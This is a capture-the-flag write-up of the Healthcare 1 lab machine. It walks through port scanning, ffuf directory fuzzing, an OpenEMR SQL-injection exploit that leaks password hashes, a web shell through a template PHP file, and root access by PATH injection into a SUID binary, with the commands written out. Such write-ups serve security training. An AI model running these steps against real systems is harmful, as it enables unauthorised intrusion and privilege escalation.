## recon
nmap showed port 80 and 21 were open 

![[Pasted image 20230623103636.png]]

let's see what's there on port 80:
we get the version and the server running i.e apache 2.2.17
look for vuln in this version , we also get some disallowed entries in the robots.txt where `/admin` is one of them , title is a bit cheesy 
***
## Port 80
the website looks like this:
![[Pasted image 20230623104412.png]]
there's a timer saying coming soon
and when we put out email into it we get this error when we don't give the right format so there is some kind of front-end verification:
![[Pasted image 20230623105012.png]]
***
### Fuzzing
after bruteforcing with ffuf -> when used the `big.txt` for files of seclist we get:
```
  2   │         "FUZZ": "addon-modules"  
  3   │         "FUZZ": ".htaccess"  
  4   │         "FUZZ": ".htpasswd"  
  5   │         "FUZZ": "css"  
  6   │         "FUZZ": "cgi-bin/"  
  7   │         "FUZZ": "favicon"  
  8   │         "FUZZ": "favicon.ico"  
  9   │         "FUZZ": "fonts"  
 10   │         "FUZZ": "gitweb"  
 11   │         "FUZZ": "images"  
 12   │         "FUZZ": "index"  
 13   │         "FUZZ": "js"  
 14   │         "FUZZ": "phpMyAdmin"  
 15   │         "FUZZ": "robots"  
 16   │         "FUZZ": "robots.txt"  
 17   │         "FUZZ": "server-status"  
 18   │         "FUZZ": "server-info"  
 19   │         "FUZZ": "vendor"
```
most of them which are 403 
so I also try one wordlist for directory also: `directory-list-2.3-big.txt` , a better practice to widen out our surface

```
ffuf -ic -c -u 'http://192.168.29.9/FUZZ' -e / -w /home/vidhyadhar/Desktop/siddh_16_march_2023/siddharth/lord_of_the_strings/seclist/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -fc 403 | tee -a healthcare1.ffuf
```

we  get this list:
```
   * FUZZ:    
   * FUZZ: /  
   * FUZZ: index  
   * FUZZ: images  
   * FUZZ: css  
   * FUZZ: js  
   * FUZZ: vendor  
   * FUZZ: favicon  
   * FUZZ: robots  
   * FUZZ: fonts  
   * FUZZ: gitweb  
   * FUZZ:    
   * FUZZ: /  
   * FUZZ: openemr  
   * FUZZ: openemr/
```

look at this endpoint: `openemr` , we visit it , looks like this , exposing it's version
![[Pasted image 20230623113146.png]]
search for it and we get it is vulnerable to sqli:
![[Pasted image 20230623113319.png]]

we download the exploit and change the url to our endpoint:
we get two users and their hash:
```
admin : 3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical : ab24aed5a7c4ad45615cd7e0da816eea39e4895d
```

hail!!! crackstation :
![[Pasted image 20230623120146.png]]
`ackbar` and `medical`

we go inside the admin panel:
![[Pasted image 20230623120308.png]]
now we need to somehow get this to reverse shell
inside the administration section we find files and inside it config.php and a custom_pdf.php:
![[Pasted image 20230623120459.png]]

and after calling the url:
`http://192.168.29.9/openemr/sites/default/letter_templates/custom_pdf.php`

we get the shell
after doing `whoami` we get we have the shell of apache

we stabilize the shell :
***
step 1:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

step 2:
do `ctrl+z` your main system terminal should have opened and then write this:
```
stty raw -echo; fg
```

then press `enter` two times , your terminal for the machine should be back , also type this to get some env variables like clear in that machine:
```
export TERM=xterm
```
***
and we get the users.txt flag:
![[Pasted image 20230623132303.png]]

## Privelage escalation
the first step is to look for any binary that we can have enough permissions to run as root so that we can escalate privelages
`find / -perm -4000 -ls 2>/dev/null`


![[Pasted image 20230623140024.png]]

looks cheesy right?!!
let's try and run , it says scanning system
it does so much , getting binary , checking network and all , let's get this file to our pc via scp:
```
scp /usr/bin/healthcheck user@ip:/home/user/
```

when we do strings in this binary:
![[Pasted image 20230625222903.png]]

we see that it is using various commands , now look at the name of the binaries , beware devs never give relative path or binary without path , we can use this `PATH injection` attack to  Privilege Escalation:
I'll make use of clear command:
what we'll do is we'll fool the binary to execute the 'clear' command that we will set it up for it and that would be the '/bin/bash' in disguise , and since it hasn't given us the abs path we can define the $PATH variable ourselves and give that location that is writable to us and there we will place our fake clear:
***
step 1:
```shell
# Copy the bash binary to /tmp/clear
cp /bin/bash /tmp/clear
```

step 2:
```shell
# Add /tmp first in path precedence so /tmp/clear resolves first
export PATH=/tmp:$PATH
```
now our path looks like this:
![[Pasted image 20230625223420.png]]
and :
![[Pasted image 20230625223646.png]]


step 3:
```shell
# Run the binary
/usr/bin/healthcheck
```

and we get the shell:
![[Pasted image 20230625223819.png]]

for more practice about this method you can visit the tryhackme's :
https://tryhackme.com/room/linprivesc
and try the PATH challenge
***

### Other writeups
[#]one of the best post-exploit enum:
```
https://benheater.com/vulnhub-healthcare-1/
```

[#] this one's good too:
```
https://blog.ikuamike.io/posts/2021/healthcare1/
```



